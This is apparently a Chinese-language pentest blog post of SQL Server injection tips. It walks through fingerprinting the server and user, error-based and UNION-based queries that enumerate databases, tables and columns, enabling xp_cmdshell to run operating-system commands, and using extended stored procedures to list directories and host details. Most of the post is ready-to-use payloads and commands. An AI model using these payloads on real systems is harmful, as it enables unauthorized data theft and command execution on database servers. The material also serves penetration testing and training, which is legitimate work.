+++
title = "SQL注入tips(SQL Server)"
topics = ["Pentest"]
tags = ["injection"]
description = "SQL Server注入常见的一些注入手法"
date = "2018-09-04T10:09:17+08:00"
draft = false
+++

### 0x00 基础信息探测
```sql
@@VERSION,@@SERVERNAME,@@SERVICENAME;
--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
--WIN-2008
--MSSQLSERVER

USER,CURRENT_USER,SESSION_USER,SYSTEM_USER;
--dbo
--dbo
--dbo
--sa

USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME();
--dbo
--wyb
--46530
--sa

USER_ID(),USER_SID();
--1
--<01>

ORIGINAL_LOGIN();
--sa
```

### 0x01 判断是否为sa权限
![75](/img/post/20180904-105516.png)

### 0x02 进行注入
* 得到所有数据库名字
![75](/img/post/20180904-110306.png)
```
--报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库
select id,name from msg where id=1 and 0<>(select name from master.dbo.sysdatabases where dbid=7);
```
![75](/img/post/20180904-151240.png)

* 得到数据库test的所有表名（用户创建的表xtype的值是U）
![70](/img/post/20180904-111912.png)

```
--得到数据库test的第一张表
select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U';

--得到数据库test的第二张表
select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U' and name not in ('article');
```
![80](/img/post/20180904-151551.png)

* 得到数据库test的表article的所有列名（先得到article的表id，然后得到列名）
![60](/img/post/20180904-112859.png)
![75](/img/post/20180904-112938.png)

* 得到数据库test的表article的数据
![75](/img/post/20180904-113720.png)

### 0x03 常见的SQL Server扩展存储过程 
* 执行系统命令

```bash
#判断xp_cmdshell是否被删除
?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell');

#开启xp_cmdshell
exec sp_configure 'show advanced options',1;
reconfigure;
exec sp_configure 'xp_cmdshell',1;
reconfigure;

#使用xp_cmdshell执行命令
exec master..xp_cmdshell 'whoami';
```

* 文件操作

```
#列目录、文件
exec master..xp_dirtree 'c:\wwwroot',1 #列c:\wwwroot下的文件夹 
exec master..xp_dirtree 'c:\wwwroot',1,1 #列c:\wwwroot下的文件夹和文件

exec master..xp_subdirs 'c:\wwwroot' #列c:\wwwroot下的文件夹

#显示系统可用盘符
exec master..xp_availablemedia
```

* 主机、中间件信息

```
#获得MS SQL的版本号
exec master..sp_msgetversion

#列出服务器上所有windows本地用户组
exec master..xp_enumgroups

#得到当前sql server服务器的计算机名称
exec master..xp_getnetname

#服务器安全模式信息
exec master..xp_loginconfig
```
